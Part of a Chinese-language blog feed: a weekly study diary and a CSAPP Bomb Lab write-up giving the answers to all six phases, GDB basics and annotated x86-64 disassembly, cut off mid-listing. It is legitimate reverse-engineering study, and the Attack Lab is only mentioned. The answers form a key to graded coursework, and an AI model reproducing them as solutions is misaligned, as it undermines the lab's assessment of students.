    <content type="html"><![CDATA[<p>2020年1月 ~ 6月</p><p>关键词: 疫情, 学习, 健身</p><a id="more"></a><p>第一篇半年记, 一时间竟然有些不知道该些写什么.</p><p>从头说起吧, 纯流水账. </p><p>明天再写吧(咕咕警告)</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2020年1月 ~ 6月&lt;/p&gt;
&lt;p&gt;关键词: 疫情, 学习, 健身&lt;/p&gt;
    
    </summary>
    
    
      <category term="时与光" scheme="http://yoursite.com/categories/%E6%97%B6%E4%B8%8E%E5%85%89/"/>
    
    
      <category term="小结" scheme="http://yoursite.com/tags/%E5%B0%8F%E7%BB%93/"/>
    
      <category term="半年记" scheme="http://yoursite.com/tags/%E5%8D%8A%E5%B9%B4%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>时与光W_202007-1</title>
    <link href="http://yoursite.com/2020/07/06/%E6%97%B6%E4%B8%8E%E5%85%89W-202007-1/"/>
    <id>http://yoursite.com/2020/07/06/%E6%97%B6%E4%B8%8E%E5%85%89W-202007-1/</id>
    <published>2020-07-06T12:56:41.000Z</published>
    <updated>2020-07-06T13:55:13.051Z</updated>
    
    <content type="html"><![CDATA[<p>2020年6月29日 ~ 7月5日.</p><p>学习CSAPP</p><p>追剧, 游戏, 爬山</p><a id="more"></a><h2 id="学习CSAPP"><a href="#学习CSAPP" class="headerlink" title="学习CSAPP"></a>学习CSAPP</h2><p>完成了Bomb Lab的最后两个炸弹, 并且撰写完成了<a href="[https://luy-hb.xyz/2020/07/01/CSAPP-Lab%E7%AC%94%E8%AE%B02-Bomb/](https://luy-hb.xyz/2020/07/01/CSAPP-Lab笔记2-Bomb/">实验报告</a>)</p><p>巩固了上周最后遗留的不太理解的栈溢出攻击等知识点, 开始完成Attack Lab. 目前已完成了前两个小关. </p><p>Attack Lab 是特别针对栈溢出攻击设计的配套实验 <del>虽然我觉得一小节一个实验非常奇怪</del>, 分别要求使用代码注入攻击与ROP(面向返回编程）对代码进行破坏. </p><p>此外还在继续学习有关内存的层次结构等章节, 计划本周内写完有关内存的一篇学习报告.</p><h2 id="追剧-游戏-爬山"><a href="#追剧-游戏-爬山" class="headerlink" title="追剧, 游戏, 爬山"></a>追剧, 游戏, 爬山</h2><h3 id="追剧"><a href="#追剧" class="headerlink" title="追剧"></a>追剧</h3><p>这周将隐蔽的角落看完了, 结局和自己中途推理的基本一致, 也有些许出入. (当然结局本身就是众说纷纭的). 起码早早地看出来朝阳是Boss了不是吗😂</p><p>最佩服自己的是第一集看到张老师一口气一杯水的时候就吐槽 “ 这么能喝怕不是个糖尿病吧 “ , 谁知道居然一语成谶, 不过本身也是瞎猫碰上死耗子了.</p><h3 id="游戏"><a href="#游戏" class="headerlink" title="游戏"></a>游戏</h3><p>今年Steam夏促真不行…最后一百出头入了 <a href="https://www.xiaoheihe.cn/games/detail/638230" target="_blank" rel="noopener">风之旅人</a> + <a href="https://www.xiaoheihe.cn/games/detail/632360" target="_blank" rel="noopener">雨中冒险2</a> + (被舍友安利的) <a href="https://www.xiaoheihe.cn/games/detail/8870" target="_blank" rel="noopener">生化奇兵:无限</a>. </p><p>当晚打开了散步模拟器风之旅人. 其实作品本身倒是没有特别打动人的地方. 讲述的不过是一次经历千山万水的朝圣之旅, 哪怕洪水滔天,危机四伏, 命丧白土. 画面确实非常优秀, 沙漠的细腻触感比较真实. 部分画面也很适合截图当屏保, 但网上普遍略有过誉.</p><p>一周目偶有遇到几个同行人, 可惜都匆匆离去, 大概是多周目玩家已经没有了荒野中遇到伙伴时的欣喜. 二周目的时候在断桥遇见了一位红袍, 似乎ta也并不是新手, 但是还是很激动地在我身边鸣叫. 于是我第一次遇到真正意义上的同行者. 我们在路上互相充能, 用单调的音节琴瑟和鸣, 在飞龙第一次出现前互相发出短促的提醒, 在雪地里看见ta被挑飞而无能为力, 在暴风雪中里用尽最后一丝力气发出微不可闻的鼓励. 最终在山巅, 在空中, 在瀑布, 在微光中起舞. 丝带在圣光的沾染中螺旋缠绕, 我突然有些庆幸选择开始了二周目, 而不是气呼呼地从硬盘中卸载游戏, 然后在他人问起时说一句: “ 啊画面挺好, 但不值.” </p><p>谢谢你, 一期一会的陌生人. </p><p>当然最后实在是不忍离别23333, 在雪地上磕磕绊绊地一个一个字符地写下自己的联系方式, 最后! 居然! 成功地! 加上了好友, 真是太幸运了~</p><h3 id="爬山"><a href="#爬山" class="headerlink" title="爬山"></a>爬山</h3><p>一开始听说本地到黄山的高铁通车了, 想着周末去玩结果那里下雨. 但是已经勾起我的爬山欲望了23333. 第二天周六就收拾下准备起早去爬隔壁的小山. 临走前想想又把高中同学拽上了! 一天刷了俩座山.</p><p>不过这个小土坡就是没挑战性啦.σ` ∀´)ﾟ∀ﾟ)σ (`ヮ´)</p><p>晚上吃了快乐烤鱼, 好恰.</p><p>结果第二天趴在床上起不来了o(TヘTo)</p><h2 id="其他琐碎事件"><a href="#其他琐碎事件" class="headerlink" title="其他琐碎事件"></a>其他琐碎事件</h2><p>收了好多专业书, 希望能一本本刷完! 加油! </p><h2 id="上周目标完成度"><a href="#上周目标完成度" class="headerlink" title="上周目标完成度"></a>上周目标完成度</h2><ul><li>[x] 继续CSAPP </li><li>[x] 开始刷LC</li><li>[x] 控制每日游戏时长</li></ul><p>都有做到! ✌</p><p>不过 LC 感觉自己还有很多不太清楚, 复杂度大概算是 O(能过) </p><p>好久没有玩平安京了, 有效控制.<del>虽说是把时间花在journey上了</del></p><h2 id="下周目标"><a href="#下周目标" class="headerlink" title="下周目标"></a>下周目标</h2><p>继续CSAPP (要加快速度了! )  </p><p>继续刷 LC</p><p>产出两篇以上的学习笔记(总结不算) </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2020年6月29日 ~ 7月5日.&lt;/p&gt;
&lt;p&gt;学习CSAPP&lt;/p&gt;
&lt;p&gt;追剧, 游戏, 爬山&lt;/p&gt;
    
    </summary>
    
    
      <category term="时与光" scheme="http://yoursite.com/categories/%E6%97%B6%E4%B8%8E%E5%85%89/"/>
    
    
      <category term="小结" scheme="http://yoursite.com/tags/%E5%B0%8F%E7%BB%93/"/>
    
      <category term="周记" scheme="http://yoursite.com/tags/%E5%91%A8%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP-Lab笔记2:Bomb</title>
    <link href="http://yoursite.com/2020/07/01/CSAPP-Lab%E7%AC%94%E8%AE%B02-Bomb/"/>
    <id>http://yoursite.com/2020/07/01/CSAPP-Lab%E7%AC%94%E8%AE%B02-Bomb/</id>
    <published>2020-07-01T05:58:10.000Z</published>
    <updated>2020-08-01T08:13:39.120Z</updated>
    
    <content type="html"><![CDATA[<p>这是我在2020年6月26日~7月1日完成的Bomb Lab的题解与笔记</p><p>炸弹实验室是CS:APP 配套实验中的第二个实验, 通过对二进制文件反汇编来分析获得拆除炸弹的密码.</p><p>本文显式地包含答案, 如果你想自己解决,不建议使用本文.</p><p><a href="https://github.com/luy-0/CS-APP-LABs/tree/master/Lab-Answer_HB/Lab2-BombLab" target="_blank" rel="noopener">对应Github仓库 点我</a></p><a id="more"></a><h2 id="Catalog"><a href="#Catalog" class="headerlink" title="Catalog"></a>Catalog</h2><ol><li>GDB    包括GDB基本使用法, 但不全面</li><li>Bombs  包括各炸弹的题解与答案</li><li>Functions    包括各函数及其受调用函数的反汇编,及解释</li></ol><h2 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h2><h3 id="Breakpoints"><a href="#Breakpoints" class="headerlink" title="Breakpoints"></a>Breakpoints</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">break sum进入sum()时断点</span><br><span class="line">break *0x80483c3 在地址 0x80483c3 设置断点(注意&#96;\*号)</span><br></pre></td></tr></table></figure><h3 id="Execution"><a href="#Execution" class="headerlink" title="Execution"></a>Execution</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stepi n执行n条指令,缺省为1 会进入被调用函数</span><br><span class="line">nexti n执行n条指令,缺省为1 不会进入被调用函数</span><br></pre></td></tr></table></figure><h3 id="Print"><a href="#Print" class="headerlink" title="Print"></a>Print</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">print (char *) 0xbfff890   Examine a string stored at 0xbffff890</span><br><span class="line"></span><br><span class="line">print  &#x2F;x $rip         十六进制打印rip寄存器 (&#x2F;x可换为&#x2F;d或&#x2F;b)</span><br><span class="line"></span><br><span class="line">print *(int *) 0xbffff890 Print integer at address 0xbffff890</span><br><span class="line"></span><br><span class="line">print *(int **) ($rsp+8)Print address at address  ($rsp+8)</span><br></pre></td></tr></table></figure><h3 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> info registers     Print all registers and their contents </span><br><span class="line"></span><br><span class="line">info breakpoints  Print status of user-settable breakpoints</span><br></pre></td></tr></table></figure><h2 id="Bombs"><a href="#Bombs" class="headerlink" title="Bombs"></a>Bombs</h2><h3 id="Bomb1"><a href="#Bomb1" class="headerlink" title="Bomb1"></a>Bomb1</h3><p>炸弹1涉及到以下函数:</p><ol><li>Phase_1</li><li>strings_not_equal</li><li>string_length</li></ol><p>输入一个字符串, 它将与位于地址<code>0x402400</code>的字符串比较, 相符即可拆除.</p><p>因此答案为:</p><blockquote><p>Border relations with Canada have never been better.</p></blockquote><h3 id="Bomb2"><a href="#Bomb2" class="headerlink" title="Bomb2"></a>Bomb2</h3><p>炸弹2涉及到以下函数:</p><ol><li>Phase_2</li><li>read_six_numbers</li></ol><p>输入6个数字, 第一个是1, 剩下成公比为2的G.P. 即可拆除.</p><p>因此答案为:</p><blockquote><p>1 2 4 8 16 32</p></blockquote><h3 id="Bomb3"><a href="#Bomb3" class="headerlink" title="Bomb3"></a>Bomb3</h3><p>炸弹3涉及到以下函数:</p><ol><li>phase_3</li><li>__isoc99_sscanf</li></ol><p>输入两个数字, 这两个数字必须是以下8组之一:</p><ul><li>0    207</li><li>1    311</li><li>2    707</li><li>3    256</li><li>4    389</li><li>5    206</li><li>6    682</li><li>7    327</li></ul><p>例如,答案可以输入:</p><blockquote><p>2   707</p></blockquote><p>答案不唯一</p><h3 id="Bomb4"><a href="#Bomb4" class="headerlink" title="Bomb4"></a>Bomb4</h3><p>这个递归炸弹真把我整🤮了… 每一条汇编指令都能看懂在干什么, 合在一起就傻了, 连猜带蒙把答案鼓捣出来了…</p><p>我讨厌递归😭</p><p>PS: 后来用反汇编解决了</p><p>炸弹4涉及到以下函数:</p><ol><li>phase_4</li><li>func4</li></ol><p>输入两个数字, 数字1必须为 <code>{0,1,3,7}</code> 中任一个, 数字2必须为 <code>0</code>.</p><p>例如, 答案可以输入:</p><blockquote><p>3  0</p></blockquote><p>答案不唯一</p><h3 id="Bomb-5"><a href="#Bomb-5" class="headerlink" title="Bomb 5"></a>Bomb 5</h3><p>相对不难的映射炸弹, 将输入的字符进行运算映射到特定地址, 并根据这些地址中取出的字符判断是否爆炸.</p><p>炸弹5涉及到以下函数:</p><ol><li>phase_5</li><li>strings_not_equal</li><li>string_length</li></ol><p>输入长度为6的字符串, 每个字符都要符合以下条件:</p><ol><li>第一个字符的ASCII码必须是<code>0x?9</code></li><li>第二个字符的ASCII码必须是<code>0x?f</code></li><li>第三个字符的ASCII码必须是<code>0x?e</code></li><li>第四个字符的ASCII码必须是<code>0x?5</code></li><li>第五个字符的ASCII码必须是<code>0x?6</code></li><li>第六个字符的ASCII码必须是<code>0x?7</code></li></ol><p>其中,<code>?</code>表示任意数字, 例如:</p><ol><li><p><code>?</code>全部取4 . 应输入的字符串为:</p><blockquote><p>IONEFG</p></blockquote></li><li><p><code>?</code>全部取3 . 应输入的字符串为:</p><blockquote><p>9?&gt;567</p></blockquote></li><li><p><code>?</code>也不一定只取同一个值, 例如第12,34,56字符的<code>?</code>值分别取3,4,6. 应输入的字符串为:</p><blockquote><p>9?NEfg</p></blockquote></li></ol><p>上述字符串均可作为答案, 答案不唯一.</p><h3 id="Bomb-6"><a href="#Bomb-6" class="headerlink" title="Bomb 6"></a>Bomb 6</h3><p>比较烦的循环炸弹, 一共涉及到了6个循环(还包括一个嵌套循环) ,一点点捋开就好了.要求输入六个不同数字, 每个数字都必须在1-6之间,并且数字需要按照固定顺序</p><p>炸弹6涉及以下函数:</p><ol><li>phase_6</li><li>read_six_numbers</li></ol><p>输入的每个数字最后都会映射到一个三位数上, 要求被映射顺序必须使由大到小, 因此输入的数字必须按照固定顺序. </p><p>答案:</p><blockquote><p>4,3,2,1,6,5</p></blockquote><h2 id="Functions"><a href="#Functions" class="headerlink" title="Functions"></a>Functions</h2><h3 id="Main"><a href="#Main" class="headerlink" title="Main()"></a>Main()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *input;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 读入数据 */</span></span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">1</span>) &#123;  </span><br><span class="line">infile = <span class="built_in">stdin</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (argc == <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(infile = fopen(argv[<span class="number">1</span>], <span class="string">"r"</span>))) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%s: Error: Couldn't open %s\n"</span>, argv[<span class="number">0</span>], argv[<span class="number">1</span>]);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">8</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Usage: %s [&lt;input_file&gt;]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 开始炸弹 */</span></span><br><span class="line">    initialize_bomb();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Welcome to my fiendish little bomb. You have 6 phases with\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"which to blow yourself up. Have a nice day!\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Bomb1 */</span></span><br><span class="line">    input = read_line();          </span><br><span class="line">    phase_1(input);               </span><br><span class="line">    phase_defused();                 </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Phase 1 defused. How about the next one?\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Bomb2 */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_2(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"That's number 2.  Keep going!\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Bomb3 */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_3(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Halfway there!\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Bomb4 */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_4(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"So you got that one.  Try this one.\n"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* Bomb5 */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_5(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Good work!  On to the next...\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Bomb6 */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_6(input);</span><br><span class="line">    phase_defused();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 结束 */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="Phase-1"><a href="#Phase-1" class="headerlink" title="Phase_1"></a>Phase_1</h3><ul><li>输入: 一个字符指针 input</li><li>功能: input 指向对象与 地址<code>$0x402400</code>指向对象相同,不同炸</li><li>调用: strings_not_equal();  </li><li>返回: 0</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function phase_1:</span><br><span class="line">&#x2F;&#x2F;rdi &#x3D; *input</span><br><span class="line">    0x0000000000400ee0 &lt;+0&gt;:sub    $0x8,%rsp        &#x2F;&#x2F;栈下调8位</span><br><span class="line">    0x0000000000400ee4 &lt;+4&gt;:mov    $0x402400,%esi   &#x2F;&#x2F;$0x402400 放入%esi(参数2)</span><br><span class="line">    0x0000000000400ee9 &lt;+9&gt;:callq  0x401338 &lt;strings_not_equal&gt; &#x2F;&#x2F;调用strings_not_equal</span><br><span class="line">    0x0000000000400eee &lt;+14&gt;:test   %eax,%eax       &#x2F;&#x2F;检测参1参2是否相同</span><br><span class="line">    0x0000000000400ef0 &lt;+16&gt;:je     0x400ef7 &lt;phase_1+23&gt;    &#x2F;&#x2F;0相同 转+23</span><br><span class="line">    0x0000000000400ef2 &lt;+18&gt;:callq  0x40143a &lt;explode_bomb&gt;  &#x2F;&#x2F;1不同,炸</span><br><span class="line">    0x0000000000400ef7 &lt;+23&gt;:add    $0x8,%rsp    &#x2F;&#x2F;出栈</span><br><span class="line">    0x0000000000400efb &lt;+27&gt;:retq</span><br></pre></td></tr></table></figure><h3 id="strings-not-equal"><a href="#strings-not-equal" class="headerlink" title="strings_not_equal"></a>strings_not_equal</h3><ul><li>输入: 参数12 均为字符地址</li><li>功能: 比较两个指向对象长度与内容是否相同</li><li>调用: string_length()</li><li>返回: 相同返回0, 不同返回1</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function strings_not_equal:</span><br><span class="line">&#x2F;* rdi &#x3D; *input; esi &#x3D; $0x402400</span><br><span class="line">    0x0000000000401338 &lt;+0&gt;:push   %r12</span><br><span class="line">    0x000000000040133a &lt;+2&gt;:push   %rbp</span><br><span class="line">    0x000000000040133b &lt;+3&gt;:push   %rbx     &#x2F;&#x2F;以上保存环境</span><br><span class="line">    0x000000000040133c &lt;+4&gt;:mov    %rdi,%rbx    &#x2F;&#x2F;rbx &#x3D; *input</span><br><span class="line">    0x000000000040133f &lt;+7&gt;:mov    %rsi,%rbp    &#x2F;&#x2F;rbp &#x3D; $0x402400(地址)</span><br><span class="line">    0x0000000000401342 &lt;+10&gt;:callq  0x40131b &lt;string_length&gt; &#x2F;&#x2F;调用string_length, 参数不变</span><br><span class="line">    0x0000000000401347 &lt;+15&gt;:mov    %eax,%r12d   &#x2F;&#x2F;r12d(双字)保存字符串长度</span><br><span class="line">    0x000000000040134a &lt;+18&gt;:mov    %rbp,%rdi    &#x2F;&#x2F;计算($0x402400)的长度</span><br><span class="line">    0x000000000040134d &lt;+21&gt;:callq  0x40131b &lt;string_length&gt; &#x2F;&#x2F;($0x402400)长度保存在rax</span><br><span class="line">    0x0000000000401352 &lt;+26&gt;:mov    $0x1,%edx    &#x2F;&#x2F;edx &#x3D; 1</span><br><span class="line">    0x0000000000401357 &lt;+31&gt;:cmp    %eax,%r12d   &#x2F;&#x2F;字符串与常数长度比较</span><br><span class="line">    0x000000000040135a &lt;+34&gt;:jne    0x40139b &lt;strings_not_equal+99&gt;  &#x2F;&#x2F;长度不同转99</span><br><span class="line">    0x000000000040135c &lt;+36&gt;:movzbl (%rbx),%eax  &#x2F;&#x2F;串1 -&gt; rax</span><br><span class="line">    0x000000000040135f &lt;+39&gt;:test   %al,%al</span><br><span class="line">    0x0000000000401361 &lt;+41&gt;:je     0x401388 &lt;strings_not_equal+80&gt;&#x2F;&#x2F;如果串1空,转80</span><br><span class="line">    0x0000000000401363 &lt;+43&gt;:cmp    0x0(%rbp),%al        &#x2F;&#x2F;比较串1串2</span><br><span class="line">    0x0000000000401366 &lt;+46&gt;:je     0x401372 &lt;strings_not_equal+58&gt;  &#x2F;&#x2F;相等,转58</span><br><span class="line">    0x0000000000401368 &lt;+48&gt;:jmp    0x40138f &lt;strings_not_equal+87&gt;  &#x2F;&#x2F;不等,转87</span><br><span class="line">    0x000000000040136a &lt;+50&gt;:cmp    0x0(%rbp),%al    &#x2F;&#x2F;比较(常数)与字符串</span><br><span class="line">    0x000000000040136d &lt;+53&gt;:nopl   (%rax)       &#x2F;&#x2F;好像是对齐用的? 无操作</span><br><span class="line">    0x0000000000401370 &lt;+56&gt;:jne    0x401396 &lt;strings_not_equal+94&gt;  &#x2F;&#x2F;不等转94</span><br><span class="line">    0x0000000000401372 &lt;+58&gt;:add    $0x1,%rbx    &#x2F;&#x2F;字符串指针++</span><br><span class="line">    0x0000000000401376 &lt;+62&gt;:add    $0x1,%rbp    &#x2F;&#x2F;常数地址指针++</span><br><span class="line">    0x000000000040137a &lt;+66&gt;:movzbl (%rbx),%eax  </span><br><span class="line">    0x000000000040137d &lt;+69&gt;:test   %al,%al      &#x2F;&#x2F;如果字符串不空</span><br><span class="line">    0x000000000040137f &lt;+71&gt;:jne    0x40136a &lt;strings_not_equal+50&gt; &#x2F;&#x2F;转+50</span><br><span class="line">    0x0000000000401381 &lt;+73&gt;:mov    $0x0,%edx&#x2F;&#x2F;如果串1空</span><br><span class="line">    0x0000000000401386 &lt;+78&gt;:jmp    0x40139b &lt;strings_not_equal+99&gt;</span><br><span class="line">    0x0000000000401388 &lt;+80&gt;:mov    $0x0,%edx&#x2F;&#x2F;上接41,串1空, 返回0</span><br><span class="line">    0x000000000040138d &lt;+85&gt;:jmp    0x40139b &lt;strings_not_equal+99&gt;</span><br><span class="line">    0x000000000040138f &lt;+87&gt;:mov    $0x1,%edx    &#x2F;&#x2F;上接48,串12不等,返回1</span><br><span class="line">    0x0000000000401394 &lt;+92&gt;:jmp    0x40139b &lt;strings_not_equal+99&gt;</span><br><span class="line">    0x0000000000401396 &lt;+94&gt;:mov    $0x1,%edx    &#x2F;&#x2F;上接94,串不等,返回1</span><br><span class="line">    0x000000000040139b &lt;+99&gt;:mov    %edx,%eax    &#x2F;&#x2F;上接34,长度不等,返回1</span><br><span class="line">    0x000000000040139d &lt;+101&gt;:pop    %rbx </span><br><span class="line">    0x000000000040139e &lt;+102&gt;:pop    %rbp</span><br><span class="line">    0x000000000040139f &lt;+103&gt;:pop    %r12 &#x2F;&#x2F;恢复环境</span><br><span class="line">    0x00000000004013a1 &lt;+105&gt;:retq</span><br></pre></td></tr></table></figure><p>注:</p><ol><li><p>开头结尾有保存环境的push与pop操作</p></li><li><p>r12d 指12寄存器的双字部分, 依次是:r12, r12d, r12w, r12b. d疑似指double word</p></li><li><p>nopl 为无操作, 可参考<a href="https://exp.newsmth.net/topic/article/9a37ce02c405b2b7ae9558f161f38c38" target="_blank" rel="noopener">这里</a>.</p></li><li><p>过程:</p><ol><li>先比较两串的长度,若不同直接返回1(+34); </li><li>然后一个一个bit地比较, 每次比较完跳转回+50, 直到全部比较结束, 串为空,返回0</li><li>当比较中遇到串不等, 立刻退出,返回1</li></ol></li><li><p>疑惑:</p><ol><li><p>为什么每次指针仅仅是自加? 每次是对al比较(1byte), 指针+4岂不美哉?</p></li><li><p>87,94,99都是出错, 返回1, 为什么不合并成1个? </p><p>(猜测:可能是优化级别不够, 照顾我们的智力水平😂)</p></li></ol></li></ol><h3 id="string-length"><a href="#string-length" class="headerlink" title="string_length"></a>string_length</h3><ul><li>输入: 字符指针</li><li>功能: 返回指向的串的长度, 空返回0</li><li>无调用</li><li>返回: 返回指向的串的长度, 空返回0</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">rdi &#x3D; *input; </span><br><span class="line">Dump of assembler code for function string_length:</span><br><span class="line">    0x000000000040131b &lt;+0&gt;:cmpb   $0x0,(%rdi)      </span><br><span class="line">    0x000000000040131e &lt;+3&gt;:je     0x401332 &lt;string_length+23&gt;  &#x2F;&#x2F;如果input空, 转23(返回0)</span><br><span class="line">    0x0000000000401320 &lt;+5&gt;:mov    %rdi,%rdx        &#x2F;&#x2F;rdx &#x3D; *input</span><br><span class="line">    0x0000000000401323 &lt;+8&gt;:add    $0x1,%rdx        &#x2F;&#x2F;rdx ++ 每轮将指针+1 </span><br><span class="line">    0x0000000000401327 &lt;+12&gt;:mov    %edx,%eax    &#x2F;&#x2F;eax &#x3D;rdx</span><br><span class="line">    0x0000000000401329 &lt;+14&gt;:sub    %edi,%eax    &#x2F;&#x2F;eax -&#x3D; edi, 当前指针与原指针差值</span><br><span class="line">    0x000000000040132b &lt;+16&gt;:cmpb   $0x0,(%rdx)  &#x2F;&#x2F;指针指向与0比较</span><br><span class="line">    0x000000000040132e &lt;+19&gt;:jne    0x401323 &lt;string_length+8&gt;&#x2F;&#x2F;当指向非零, 表示还未结束 递归调用</span><br><span class="line">    0x0000000000401330 &lt;+21&gt;:repz retq   &#x2F;&#x2F;返还rax 即最后的差值, 为指针储存的数据的长度</span><br><span class="line">    0x0000000000401332 &lt;+23&gt;:mov    $0x0,%eax    &#x2F;&#x2F;(上接+3) 返回0</span><br><span class="line">    0x0000000000401337 &lt;+28&gt;:retq</span><br></pre></td></tr></table></figure><hr><h3 id="Phase-2"><a href="#Phase-2" class="headerlink" title="Phase_2"></a>Phase_2</h3><ul><li>输入: *input</li><li>功能: 与六个数字比较, 不同炸</li><li>调用: read_six_numbers</li><li>返回: 无</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function phase_2:</span><br><span 